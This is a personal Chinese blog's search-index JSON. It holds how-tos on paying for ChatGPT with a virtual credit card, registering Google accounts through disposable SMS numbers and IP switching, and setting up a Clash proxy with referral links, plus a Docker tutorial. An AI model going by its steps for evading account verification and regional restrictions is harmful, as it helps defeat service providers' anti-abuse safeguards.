{"meta":{"title":"小吴の博客","subtitle":"高冷白羊","description":"我的博客","author":"Snowman","url":"https://snowman12137.github.io","root":"/"},"pages":[{"title":"about","date":"2023-04-16T12:45:28.000Z","updated":"2023-04-16T12:46:28.171Z","comments":true,"path":"about/index.html","permalink":"https://snowman12137.github.io/about/index.html","excerpt":"","text":"关于我这是一个测试"},{"title":"","date":"2023-04-16T12:47:01.000Z","updated":"2024-02-03T17:23:39.226Z","comments":true,"path":"tags/index.html","permalink":"https://snowman12137.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2023-04-16T12:47:12.000Z","updated":"2024-02-03T17:22:50.822Z","comments":true,"path":"categories/index.html","permalink":"https://snowman12137.github.io/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Chatgpt api充值 / 升级plus 教程 /虚拟信用卡","slug":"Chatgpt-api充值-升级plus-教程-虚拟信用卡","date":"2024-03-15T16:00:00.000Z","updated":"2024-03-17T08:08:56.429Z","comments":true,"path":"2024/03/16/Chatgpt-api充值-升级plus-教程-虚拟信用卡/","link":"","permalink":"https://snowman12137.github.io/2024/03/16/Chatgpt-api%E5%85%85%E5%80%BC-%E5%8D%87%E7%BA%A7plus-%E6%95%99%E7%A8%8B-%E8%99%9A%E6%8B%9F%E4%BF%A1%E7%94%A8%E5%8D%A1/","excerpt":"","text":"Chatgpt api充值 &#x2F; 升级plus 教程 &#x2F;虚拟信用卡 系列文章： 科学上网工具 国内手机号注册Google账号（2024亲测有效） Chatgpt api充值 &#x2F; 升级plus 教程 &#x2F;虚拟信用卡 最近碰到好多同学问 api怎么充值 &#x2F; gpt怎么升级plus，索性就写个教程。 1. 准备 一个openai账号 一个好的科学上网工具 一张用于付款的虚拟信用卡 ①的话网上的教程已经满天飞了 这里就按下不表 ps: 我看到有说用outlook等微软旗下的邮箱充值&#x2F;升级后容易被封的，建议用别的邮箱 （有同学建议用proton 注册很方便） 注册Google账号（你需要有一个科学上网工具） 国内手机号注册Google账号（2024亲测有效） ②推荐大家找个有米国节点的 就我个人体验而言感觉成功率更高 我自己用的flyint 科学上网工具 ③国内的卡一般都是用不了的 如果有国外的卡可以直接用 没有的话按照下面的教程办一张就好 2. 虚拟信用卡 之前国内最常用的应该是DePay，但是考虑到年费和配套（DePay开卡费20刀 每月需交0.5刀月费 Wildcard开卡费11-13刀 没月费），我选择了最近比较火的 wildcard。https://bewildcard.com/i/N7M20PKS 随后就是注册操作，在注册页面可以看到一行邀请码： 填写了邀请码可以获得2刀的开卡费减免，同时邀请人也能获得2刀返佣，也算是双赢了。这里给出我的邀请码：N7M20PKS 然后会邀请你实名认证，使用支付宝认证就行， 快捷方便。 最后就是缴费开卡了，一年11.99刀（折后9.99刀）两年13.99刀（折后11.99刀），大家按需自取就好。 开完卡后的最低充值额度为10刀，按需充值就行。如果绑定api充值的话，要保证卡上至少有5美元的余额，否则会绑卡失败；chatgpt升级plus的费用为20刀 3. api绑卡、充值ps: 这里wildcard官方给出了一个插件和教程，我没有也绑上了 但是遭遇了两次充值失败才充上 很魔幻 首先进入openai官网登陆: 登陆后选择api界面，然后按图点击: 随后选择individual，再填写卡片信息即可绑定（图源Wildcard官方）: 随后就是充值，输入你要充值的数目就好: 最后也可以设置自动充值，就是余额低于你设定值的时候自从从信用卡充值xx刀。 4 api申请(参考)测边栏选中下图选项进入api管理页面 在这里，如果需要首先用一个海外手机号接码验证(如果之前开通账号的时候接过码貌似这里就不用了), 可以使用SMS-active进行接码，如果你用的是wildcard的话，直接按教程使用配套的接码服务就好。值得注意的是，每个海外手机号可以验证两个 API，如果第二次使用这个手机号验证，他会提示这个手机号已经绑定了一个 API，但还是能用的。 验证成功之后点击continue后就开始开api了: 给api起一个自己名字，然后就会你的 api key，值得注意的是 为了安全考虑 openai让你只能在这个时候看见你的完整的key，所以要及时记录下来。 到此就结束啦，可以找一些你喜欢的项目用你的api key了 5.升级gpt 如果使用wildcard直接看官网教程就好, 不是的话首先进入chatgpt对话界面 ，点击左下角箭头: 选择“Upgrade to Plus” 然后和前面一样，绑卡付费即可","categories":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"其他","slug":"科学上网/其他","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"author":"Sn0wma1n"},{"title":"国内手机号注册Google账号（2024亲测有效）","slug":"国内手机号注册Google账号（2024亲测有效）","date":"2024-03-15T16:00:00.000Z","updated":"2024-03-17T08:09:13.923Z","comments":true,"path":"2024/03/16/国内手机号注册Google账号（2024亲测有效）/","link":"","permalink":"https://snowman12137.github.io/2024/03/16/%E5%9B%BD%E5%86%85%E6%89%8B%E6%9C%BA%E5%8F%B7%E6%B3%A8%E5%86%8CGoogle%E8%B4%A6%E5%8F%B7%EF%BC%882024%E4%BA%B2%E6%B5%8B%E6%9C%89%E6%95%88%EF%BC%89/","excerpt":"","text":"国内手机号注册Google账号（2024亲测有效） 系列文章： 科学上网工具 国内手机号注册Google账号（2024亲测有效） Chatgpt api充值 &#x2F; 升级plus 教程 &#x2F;虚拟信用卡 教程来自：https://zhuanlan.zhihu.com/p/629527984 1. 注册账号我们点击创建账号（请确认能访问Goolge，推荐使用Chrome浏览器） https://accounts.google.com/ 最好点击个人用途 在账号信息界面输入姓名，这个名字随意，建议英文 填写出生日期和性别 点击创建Google邮箱地址，国外的邮箱不像国内一样是一串号码，这里可以随意填充，然后是设置密码 验证手机号 问题一(注意手机号的验证码其实是通过网络给基站发送的，如果你的手机没有梯子，那么大概率不会收到验证码，如果你不想在手机上安装梯子感觉太麻烦，移步第二种方法) 问题二当提示电话号码无法用于验证时，可能得原因是证，可能的原因是：网络IP的位置在国内；使用的语言是中文；你的注册操作过于频繁。 针对上述的问题，我们需要做相应的调整来塑造一个干净的环境来注册Gmail。 IP：我们可以通过订阅的机场切换节点来改变IP 语言：修改电脑&#x2F;手机&amp;浏览器语言——将我们电脑、手机、浏览器的默认语言设置为英文。 过于频繁： 通过订阅的机场切换不同节点改变IP 通过清除浏览历史、Cookie还原浏览器的记录。 更换设备：换一台电脑，或者从电脑换到手机 更换你注册时使用的邮箱名称：当你注册&#x41;&#x41;&#64;&#x67;&#109;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;时提示无法验证后改为&#66;&#x42;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;尝试。 因此有两种解决办法：如果没有科学上网方法用第一种，如果有的话用第二种 2 方法一谷歌浏览器在主页找到设置→语言→将默认语言设置为英语。 请确保英语排在第一位置。 删除Cookie,我们同样在设置→隐私与安全→清除浏览数据，在弹窗中的时间范围选择时间不限后清除。如果觉得清除不够干净的可以使用。我们重新进入Goolge的注册页面，一般来说就会可以成功接收到验证码啦。 3 方法二 虚拟手机号验证你要有梯子才可以登录以下界面 https://sms-activate.org/cn/getNumber 注册一个账户，这个邮箱随意，QQ邮箱也可以 然后搜索Google 然后选择你要购买的虚拟号，注意一定不要选择美国号，google对美国号有很严格的限制和检验，推荐使用那些比较偏门的国家和地区，最好是那种你从来都没见过的。因为有的号他重复被注册一些账号导致不可使用。 如果你买到了不能发送验证码的手机，过20分钟以后手机没有收到验证码钱会自动给你退掉。 购买完成后会跳转到这个页面 我们把号码复制到Google中 注册成功(忘截图了)","categories":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"其他","slug":"科学上网/其他","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"author":"Sn0wma1n"},{"title":"科学上网工具","slug":"科学上网工具","date":"2024-03-15T16:00:00.000Z","updated":"2024-03-17T08:08:27.563Z","comments":true,"path":"2024/03/16/科学上网工具/","link":"","permalink":"https://snowman12137.github.io/2024/03/16/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E5%B7%A5%E5%85%B7/","excerpt":"","text":"科学上网工具 系列文章： 科学上网工具 国内手机号注册Google账号（2024亲测有效） Chatgpt api充值 &#x2F; 升级plus 教程 &#x2F;虚拟信用卡 首先你要从某种渠道下载已经凉了的clash https://dl.clashforwindows.org/releases/latest/Clash.for.Windows.Setup.0.20.39.exe 1. 界面介绍第一个是一个General，一般全部打开 这个页面有三个选项 默认是Direct，意思就是所有的流量直接放出，并不走代理，要是想走代理要点Global 这个Profile是最主要的页面，上面有一个Download就是把你买到的机场下载下来 剩下的就没有什么用了 2. 科学上网网址首先你要从你的朋友那里要到一个免费的机场节点临时上网。 因为登录机场购买网站需要科学上网的环境(也可以找朋友帮忙注册) 然后登陆https://to.FlyintPro.com/#/register?code=tdqy9dTe（我用的是这个） 这里面选择plan购买你想购买的套餐，如果你需求量不是很大的话，建议购不限时套餐，一般200GB可以用一年多，大约200GB 120元 回到主页面点击一键订阅然后点击复制订阅地址 然后回到这个页面上粘贴过去选中以后就可以使用了 然后你就会看到以下页面，就是导入成功了，选中你想链接的节点就可以科学上网了 这个可以测量每个节点的延迟","categories":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"其他","slug":"科学上网/其他","permalink":"https://snowman12137.github.io/categories/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"科学上网","slug":"科学上网","permalink":"https://snowman12137.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"}],"author":"Sn0wma1n"},{"title":"Docker学习(三):Dockerfile与Compose","slug":"Docker学习-三-Dockerfile与Compose-cc33bdd80c804e1fb3125511f62e09c2","date":"2024-03-01T16:00:00.000Z","updated":"2024-03-02T14:19:53.451Z","comments":true,"path":"2024/03/02/Docker学习-三-Dockerfile与Compose-cc33bdd80c804e1fb3125511f62e09c2/","link":"","permalink":"https://snowman12137.github.io/2024/03/02/Docker%E5%AD%A6%E4%B9%A0-%E4%B8%89-Dockerfile%E4%B8%8ECompose-cc33bdd80c804e1fb3125511f62e09c2/","excerpt":"","text":"Docker学习(三):Dockerfile与Compose原文来自菜鸟：https://www.runoob.com/docker/docker-dockerfile.html （菜鸟讲的太详细了，泪目） 一、什么是 Dockerfile？Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。 1.使用 Dockerfile 定制镜像这里仅讲解如何运行 Dockerfile 文件来定制一个镜像，具体 Dockerfile 文件内指令详解，将在下一节中介绍，这里你只要知道构建的流程即可。 a 下面以定制一个 nginx 镜像在一个空目录下，新建一个名为 Dockerfile 文件，并在文件内添加以下内容： 12FROM nginxRUN echo &#x27;这是一个本地构建的nginx镜像&#x27; &gt; /usr/share/nginx/html/index.html b FROM 和 RUN 指令的作用FROM：定制的镜像都是基于 FROM 的镜像，这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。 RUN：用于执行后面跟着的命令行命令。有以下俩种格式： shell 格式： 12RUN &lt;命令行命令&gt;# &lt;命令行命令&gt; 等同于，在终端操作的 shell 命令。 exec 格式： 123RUN [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;]# 例如：# RUN [&quot;./test.php&quot;, &quot;dev&quot;, &quot;offline&quot;] 等价于 RUN ./test.php dev offline 注意：Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如： 1234FROM centosRUN yum -y install wgetRUN wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;RUN tar -xvf redis.tar.gz 以上执行会创建 3 层镜像。可简化为以下格式： 1234FROM centosRUN yum -y install wget \\ &amp;&amp; wget -O redis.tar.gz &quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot; \\ &amp;&amp; tar -xvf redis.tar.gz 2.开始构建镜像在 Dockerfile 文件的存放目录下，执行构建动作。 以下示例，通过目录下的 Dockerfile 构建一个 nginx:v3（镜像名称:镜像标签）。 1docker build -t nginx:v3 . a上下文路径上一节中，有提到指令最后一个 . 是上下文路径，那么什么是上下文路径呢？ 1docker build -t nginx:v3 . 上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。 解析：由于 docker 的运行模式是 C&#x2F;S。我们本机是 C，docker 引擎是 S。实际的构建过程是在 docker 引擎下完成的，所以这个时候无法用到我们本机的文件。这就需要把我们本机的指定目录下的文件一起打包提供给 docker 引擎使用。 如果未说明最后一个参数，那么默认上下文路径就是 Dockerfile 所在的位置。 注意：上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。 3 指令详解 Dockerfile 指令 说明 FROM 指定基础镜像，用于后续的指令构建。 MAINTAINER 指定Dockerfile的作者&#x2F;维护者。（已弃用，推荐使用LABEL指令） LABEL 添加镜像的元数据，使用键值对的形式。 RUN 在构建过程中在镜像中执行命令。 CMD 指定容器创建时的默认命令。（可以被覆盖） ENTRYPOINT 设置容器创建时的主要命令。（不可被覆盖） EXPOSE 声明容器运行时监听的特定网络端口。 ENV 在容器内部设置环境变量。 ADD 将文件、目录或远程URL复制到镜像中。 COPY 将文件或目录复制到镜像中。 VOLUME 为容器创建挂载点或声明卷。 WORKDIR 设置后续指令的工作目录。 USER 指定后续指令的用户上下文。 ARG 定义在构建过程中传递给构建器的变量，可使用 “docker build” 命令设置。 ONBUILD 当该镜像被用作另一个构建过程的基础时，添加触发器。 STOPSIGNAL 设置发送给容器以退出的系统调用信号。 HEALTHCHECK 定义周期性检查容器健康状态的命令。 SHELL 覆盖Docker中默认的shell，用于RUN、CMD和ENTRYPOINT指令。 COPY复制指令，从上下文目录中复制文件或者目录到容器里指定路径。 格式： 12COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径1&gt;... &lt;目标路径&gt;COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;] **[–chown&#x3D;:]**：可选参数，用户改变复制到容器内文件的拥有者和属组。 **&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如： 12COPY hom* /mydir/COPY hom?.txt /mydir/ **&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。 ADDADD 指令和 COPY 的使用格类似（同样需求下，官方推荐使用 COPY）。功能也类似，不同之处如下： ADD 的优点：在执行 &lt;源文件&gt; 为 tar 压缩文件的话，压缩格式为 gzip, bzip2 以及 xz 的情况下，会自动复制并解压到 &lt;目标路径&gt;。 ADD 的缺点：在不解压的前提下，无法复制 tar 压缩文件。会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。具体是否使用，可以根据是否需要自动解压来决定。 CMD类似于 RUN 指令，用于运行程序，但二者运行的时间点不同: CMD 在docker run 时运行。 RUN 是在 docker build。 作用：为启动的容器指定默认要运行的程序，程序运行结束，容器也就结束。CMD 指令指定的程序可被 docker run 命令行参数中指定要运行的程序所覆盖。 注意：如果 Dockerfile 中如果存在多个 CMD 指令，仅最后一个生效。 格式： 123CMD &lt;shell 命令&gt;CMD [&quot;&lt;可执行文件或命令&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...]CMD [&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] # 该写法是为 ENTRYPOINT 指令指定的程序提供默认参数 推荐使用第二种格式，执行过程比较明确。第一种格式实际上在运行的过程中也会自动转换成第二种格式运行，并且默认可执行文件是 sh。 ENTRYPOINT类似于 CMD 指令，但其不会被 docker run 的命令行参数指定的指令所覆盖，而且这些命令行参数会被当作参数送给 ENTRYPOINT 指令指定的程序。 但是, 如果运行 docker run 时使用了 –entrypoint 选项，将覆盖 ENTRYPOINT 指令指定的程序。 优点：在执行 docker run 的时候可以指定 ENTRYPOINT 运行所需的参数。 注意：如果 Dockerfile 中如果存在多个 ENTRYPOINT 指令，仅最后一个生效。 格式： 1ENTRYPOINT [&quot;&lt;executeable&gt;&quot;,&quot;&lt;param1&gt;&quot;,&quot;&lt;param2&gt;&quot;,...] 可以搭配 CMD 命令使用：一般是变参才会使用 CMD ，这里的 CMD 等于是在给 ENTRYPOINT 传参，以下示例会提到。 示例： 假设已通过 Dockerfile 构建了 nginx:test 镜像： 1234FROM nginxENTRYPOINT [&quot;nginx&quot;, &quot;-c&quot;] # 定参CMD [&quot;/etc/nginx/nginx.conf&quot;] # 变参 1、不传参运行 1$ docker run nginx:test 容器内会默认运行以下命令，启动主进程。 1nginx -c /etc/nginx/nginx.conf 2、传参运行 1$ docker run nginx:test -c /etc/nginx/new.conf 容器内会默认运行以下命令，启动主进程(&#x2F;etc&#x2F;nginx&#x2F;new.conf:假设容器内已有此文件) 1nginx -c /etc/nginx/new.conf ENV设置环境变量，定义了环境变量，那么在后续的指令中，就可以使用这个环境变量。 格式： 12ENV &lt;key&gt; &lt;value&gt;ENV &lt;key1&gt;=&lt;value1&gt; &lt;key2&gt;=&lt;value2&gt;... 以下示例设置 NODE_VERSION &#x3D; 7.2.0 ， 在后续的指令中可以通过 $NODE_VERSION 引用： 1234ENV NODE_VERSION 7.2.0RUN curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/node-v$NODE_VERSION-linux-x64.tar.xz&quot; \\ &amp;&amp; curl -SLO &quot;https://nodejs.org/dist/v$NODE_VERSION/SHASUMS256.txt.asc&quot; ARG构建参数，与 ENV 作用一致。不过作用域不一样。ARG 设置的环境变量仅对 Dockerfile 内有效，也就是说只有 docker build 的过程中有效，构建好的镜像内不存在此环境变量。 构建命令 docker build 中可以用 –build-arg &lt;参数名&gt;&#x3D;&lt;值&gt; 来覆盖。 格式： 1ARG &lt;参数名&gt;[=&lt;默认值&gt;] VOLUME定义匿名数据卷。在启动容器时忘记挂载数据卷，会自动挂载到匿名卷。 作用： 避免重要的数据，因容器重启而丢失，这是非常致命的。 避免容器不断变大。 格式： 12VOLUME [&quot;&lt;路径1&gt;&quot;, &quot;&lt;路径2&gt;&quot;...]VOLUME &lt;路径&gt; 在启动容器 docker run 的时候，我们可以通过 -v 参数修改挂载点。 EXPOSE仅仅只是声明端口。 作用： 帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。 在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。 格式： 1EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] WORKDIR指定工作目录。用 WORKDIR 指定的工作目录，会在构建镜像的每一层中都存在。以后各层的当前目录就被改为指定的目录，如该目录不存在，WORKDIR 会帮你建立目录。 docker build 构建镜像过程中的，每一个 RUN 命令都是新建的一层。只有通过 WORKDIR 创建的目录才会一直存在。 格式： 1WORKDIR &lt;工作目录路径&gt; USER用于指定执行后续命令的用户和用户组，这边只是切换后续命令执行的用户（用户和用户组必须提前已经存在）。 格式： 1USER &lt;用户名&gt;[:&lt;用户组&gt;] HEALTHCHECK用于指定某个程序或者指令来监控 docker 容器服务的运行状态。 格式： 1234HEALTHCHECK [选项] CMD &lt;命令&gt;：设置检查容器健康状况的命令HEALTHCHECK NONE：如果基础镜像有健康检查指令，使用这行可以屏蔽掉其健康检查指令HEALTHCHECK [选项] CMD &lt;命令&gt; : 这边 CMD 后面跟随的命令使用，可以参考 CMD 的用法。 ONBUILD用于延迟构建命令的执行。简单的说，就是 Dockerfile 里用 ONBUILD 指定的命令，在本次构建镜像的过程中不会执行（假设镜像为 test-build）。当有新的 Dockerfile 使用了之前构建的镜像 FROM test-build ，这时执行新镜像的 Dockerfile 构建时候，会执行 test-build 的 Dockerfile 里的 ONBUILD 指定的命令。 格式： 1ONBUILD &lt;其它指令&gt; LABELLABEL 指令用来给镜像添加一些元数据（metadata），以键值对的形式，语法格式如下： 1LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ... 比如我们可以添加镜像的作者： 1LABEL org.opencontainers.image.authors=&quot;runoob&quot; 二、Docker Compose1.什么是Docker ComposeCompose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。 Compose 使用的三个步骤： 使用 Dockerfile 定义应用程序的环境。 使用 docker-compose.yml 定义构成应用程序的服务，这样它们可以在隔离环境中一起运行。 最后，执行 docker-compose up 命令来启动并运行整个应用程序。 docker-compose.yml 的配置案例如下（配置参数参考下文）： 12345678910111213141516# yaml 配置实例version: &#x27;3&#x27;services: web: build: . ports: - &quot;5000:5000&quot; volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redisvolumes: logvolume01: &#123;&#125; Compose 安装Linux 上我们可以从 Github 上下载它的二进制包来使用，最新发行的版本地址：https://github.com/docker/compose/releases。 运行以下命令以下载 Docker Compose 的当前稳定版本： 1sudo curl -L &quot;https://github.com/docker/compose/releases/download/v2.2.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose 将可执行权限应用于二进制文件： 1sudo chmod +x /usr/local/bin/docker-compose 创建软链： 1sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose 测试是否安装成功： 12$ docker-compose versioncker-compose version 1.24.1, build 4667896b 注意： 对于 alpine，需要以下依赖包： py-pip，python-dev，libffi-dev，openssl-dev，gcc，libc-dev，和 make。 2.使用a准备12mkdir composetestcd composetest 在测试目录中创建一个名为 app.py 的文件，并复制粘贴以下内容： 1234567891011121314151617181920212223import timeimport redisfrom flask import Flaskapp = Flask(__name__)cache = redis.Redis(host=&#x27;redis&#x27;, port=6379)def get_hit_count(): retries = 5 while True: try: return cache.incr(&#x27;hits&#x27;) except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5)@app.route(&#x27;/&#x27;)def hello(): count = get_hit_count() return &#x27;Hello World! I have been seen &#123;&#125; times.\\n&#x27;.format(count) 在此示例中，redis 是应用程序网络上的 redis 容器的主机名，该主机使用的端口为 6379。 在 composetest 目录中创建另一个名为 requirements.txt 的文件，内容如下： b创建 Dockerfile 文件在 composetest 目录中，创建一个名为 Dockerfile 的文件，内容如下： 123456789FROM python:3.7-alpineWORKDIR /codeENV FLASK_APP app.pyENV FLASK_RUN_HOST 0.0.0.0RUN apk add --no-cache gcc musl-dev linux-headersCOPY requirements.txt requirements.txtRUN pip install -r requirements.txtCOPY . .CMD [&quot;flask&quot;, &quot;run&quot;] Dockerfile 内容解释： FROM python:3.7-alpine: 从 Python 3.7 映像开始构建镜像。 WORKDIR &#x2F;code: 将工作目录设置为 &#x2F;code。 ENV FLASK_APP app.py ENV FLASK_RUN_HOST 0.0.0.0 设置 flask 命令使用的环境变量。 RUN apk add –no-cache gcc musl-dev linux-headers: 安装 gcc，以便诸如 MarkupSafe 和 SQLAlchemy 之类的 Python 包可以编译加速。 COPY requirements.txt requirements.txt RUN pip install -r requirements.txt 复制 requirements.txt 并安装 Python 依赖项。 COPY . .: 将 . 项目中的当前目录复制到 . 镜像中的工作目录。 CMD [“flask”, “run”]: 容器提供默认的执行命令为：flask run。 3创建 docker-compose.yml在测试目录中创建一个名为 docker-compose.yml 的文件，然后粘贴以下内容： 123456789# yaml 配置version: &#x27;3&#x27;services: web: build: . ports: - &quot;5000:5000&quot; redis: image: &quot;redis:alpine&quot; 该 Compose 文件定义了两个服务：web 和 redis。 web：该 web 服务使用从 Dockerfile 当前目录中构建的镜像。然后，它将容器和主机绑定到暴露的端口 5000。此示例服务使用 Flask Web 服务器的默认端口 5000 。 redis：该 redis 服务使用 Docker Hub 的公共 Redis 映像。 4、使用 Compose 命令构建和运行您的应用在测试目录中，执行以下命令来启动应用程序： 1docker-compose up 如果你想在后台执行该服务可以加上 -d 参数： 1docker-compose up -d 运行成功 以下摘自菜鸟：https://www.runoob.com/docker/docker-compose.html yml 配置指令参考version指定本 yml 依从的 compose 哪个版本制定的。 build指定为构建镜像上下文路径： 例如 webapp 服务，指定为从上下文路径 .&#x2F;dir&#x2F;Dockerfile 所构建的镜像： 1234version: &quot;3.7&quot;services: webapp: build: ./dir 或者，作为具有在上下文指定的路径的对象，以及可选的 Dockerfile 和 args： 12345678910111213version: &quot;3.7&quot;services: webapp: build: context: ./dir dockerfile: Dockerfile-alternate args: buildno: 1 labels: - &quot;com.example.description=Accounting webapp&quot; - &quot;com.example.department=Finance&quot; - &quot;com.example.label-with-empty-value&quot; target: prod context：上下文路径。 dockerfile：指定构建镜像的 Dockerfile 文件名。 args：添加构建参数，这是只能在构建过程中访问的环境变量。 labels：设置构建镜像的标签。 target：多层构建，可以指定构建哪一层。 cap_add，cap_drop添加或删除容器拥有的宿主机的内核功能。 12345cap_add: - ALL # 开启全部权限cap_drop: - SYS_PTRACE # 关闭 ptrace权限 cgroup_parent为容器指定父 cgroup 组，意味着将继承该组的资源限制。 1cgroup_parent: m-executor-abcd command覆盖容器启动的默认命令。 1command: [&quot;bundle&quot;, &quot;exec&quot;, &quot;thin&quot;, &quot;-p&quot;, &quot;3000&quot;] container_name指定自定义容器名称，而不是生成的默认名称。 1container_name: my-web-container depends_on设置依赖关系。 docker-compose up ：以依赖性顺序启动服务。在以下示例中，先启动 db 和 redis ，才会启动 web。 docker-compose up SERVICE ：自动包含 SERVICE 的依赖项。在以下示例中，docker-compose up web 还将创建并启动 db 和 redis。 docker-compose stop ：按依赖关系顺序停止服务。在以下示例中，web 在 db 和 redis 之前停止。 1234567891011version: &quot;3.7&quot;services: web: build: . depends_on: - db - redis redis: image: redis db: image: postgres 注意：web 服务不会等待 redis db 完全启动 之后才启动。 deploy指定与服务的部署和运行有关的配置。只在 swarm 模式下才会有用。 12345678910111213141516171819202122version: &quot;3.7&quot;services: redis: image: redis:alpine deploy: mode：replicated replicas: 6 endpoint_mode: dnsrr labels: description: &quot;This redis service label&quot; resources: limits: cpus: &#x27;0.50&#x27; memory: 50M reservations: cpus: &#x27;0.25&#x27; memory: 20M restart_policy: condition: on-failure delay: 5s max_attempts: 3 window: 120s 可以选参数： endpoint_mode：访问集群服务的方式。 1234endpoint_mode: vip# Docker 集群服务一个对外的虚拟 ip。所有的请求都会通过这个虚拟 ip 到达集群服务内部的机器。endpoint_mode: dnsrr# DNS 轮询（DNSRR）。所有的请求会自动轮询获取到集群 ip 列表中的一个 ip 地址。 labels：在服务上设置标签。可以用容器上的 labels（跟 deploy 同级的配置） 覆盖 deploy 下的 labels。 mode：指定服务提供的模式。 replicated：复制服务，复制指定服务到集群的机器上。 global：全局服务，服务将部署至集群的每个节点。 图解：下图中黄色的方块是 replicated 模式的运行情况，灰色方块是 global 模式的运行情况。 replicas：mode 为 replicated 时，需要使用此参数配置具体运行的节点数量。 resources：配置服务器资源使用的限制，例如上例子，配置 redis 集群运行需要的 cpu 的百分比 和 内存的占用。避免占用资源过高出现异常。 restart_policy：配置如何在退出容器时重新启动容器。 condition：可选 none，on-failure 或者 any（默认值：any）。 delay：设置多久之后重启（默认值：0）。 max_attempts：尝试重新启动容器的次数，超出次数，则不再尝试（默认值：一直重试）。 window：设置容器重启超时时间（默认值：0）。 rollback_config：配置在更新失败的情况下应如何回滚服务。 parallelism：一次要回滚的容器数。如果设置为0，则所有容器将同时回滚。 delay：每个容器组回滚之间等待的时间（默认为0s）。 failure_action：如果回滚失败，该怎么办。其中一个 continue 或者 pause（默认pause）。 monitor：每个容器更新后，持续观察是否失败了的时间 (ns|us|ms|s|m|h)（默认为0s）。 max_failure_ratio：在回滚期间可以容忍的故障率（默认为0）。 order：回滚期间的操作顺序。其中一个 stop-first（串行回滚），或者 start-first（并行回滚）（默认 stop-first ）。 update_config：配置应如何更新服务，对于配置滚动更新很有用。 parallelism：一次更新的容器数。 delay：在更新一组容器之间等待的时间。 failure_action：如果更新失败，该怎么办。其中一个 continue，rollback 或者pause （默认：pause）。 monitor：每个容器更新后，持续观察是否失败了的时间 (ns|us|ms|s|m|h)（默认为0s）。 max_failure_ratio：在更新过程中可以容忍的故障率。 order：回滚期间的操作顺序。其中一个 stop-first（串行回滚），或者 start-first（并行回滚）（默认stop-first）。 注：仅支持 V3.4 及更高版本。 devices指定设备映射列表。 12devices: - &quot;/dev/ttyUSB0:/dev/ttyUSB0&quot; dns自定义 DNS 服务器，可以是单个值或列表的多个值。 12345dns: 8.8.8.8dns: - 8.8.8.8 - 9.9.9.9 dns_search自定义 DNS 搜索域。可以是单个值或列表。 12345dns_search: example.comdns_search: - dc1.example.com - dc2.example.com entrypoint覆盖容器默认的 entrypoint。 1entrypoint: /code/entrypoint.sh 也可以是以下格式： 1234567entrypoint: - php - -d - zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20100525/xdebug.so - -d - memory_limit=-1 - vendor/bin/phpunit env_file从文件添加环境变量。可以是单个值或列表的多个值。 1env_file: .env 也可以是列表格式： 1234env_file: - ./common.env - ./apps/web.env - /opt/secrets.env environment添加环境变量。您可以使用数组或字典、任何布尔值，布尔值需要用引号引起来，以确保 YML 解析器不会将其转换为 True 或 False。 123environment: RACK_ENV: development 